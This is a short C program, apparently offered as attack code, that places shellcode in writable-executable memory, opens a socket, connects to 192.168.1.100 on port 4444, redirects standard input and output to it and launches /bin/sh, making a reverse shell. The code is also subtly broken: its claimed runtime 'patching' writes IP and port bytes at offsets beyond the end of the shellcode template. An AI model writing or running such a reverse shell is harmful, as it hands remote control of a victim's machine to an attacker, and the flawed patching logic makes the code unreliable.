#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

// JIT compilation of shellcode
unsigned char jit_template[] = {
    0x48, 0x89, 0xf8,           // mov rax, rdi
    0x48, 0x31, 0xc9,           // xor rcx, rcx
    0x48, 0x31, 0xd2,           // xor rdx, rdx
    0x48, 0x31, 0xf6,           // xor rsi, rsi
    0x4d, 0x31, 0xc0,           // xor r8, r8
    0x48, 0x31, 0xff,           // xor rdi, rdi
    0x48, 0x31, 0xc0,           // xor rax, rax
    0x6a, 0x29,                 // push 41
    0x58,                       // pop rax
    0x6a, 0x02,                 // push 2
    0x5f,                       // pop rdi
    0x6a, 0x01,                 // push 1
    0x5e,                       // pop rsi
    0x6a, 0x06,                 // push 6
    0x5a,                       // pop rdx
    0x0f, 0x05,                // syscall
    0xc3                       // ret
};

int main() {
    // Allocate writable and executable memory
    void *jit_mem = mmap(NULL, sizeof(jit_template),
                         PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_ANON | MAP_PRIVATE, -1, 0);
    
    // Copy JIT template
    memcpy(jit_mem, jit_template, sizeof(jit_template));
    
    // Self-modify: patch IP and port at runtime
    unsigned char *ip_ptr = jit_mem + 0x30;  // Offset for IP
    unsigned char *port_ptr = jit_mem + 0x34; // Offset for port
    
    // 192.168.1.100
    memcpy(ip_ptr, "\xc0\xa8\x01\x64", 4);
    // Port 4444
    memcpy(port_ptr, "\x11\x5c", 2);
    
    // Execute JIT code
    int (*jit_socket)() = jit_mem;
    int sock = jit_socket();
    
    // Connect and dup2...
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &addr.sin_addr);
    
    connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    execve("/bin/sh", NULL, NULL);
    
    return 0;
}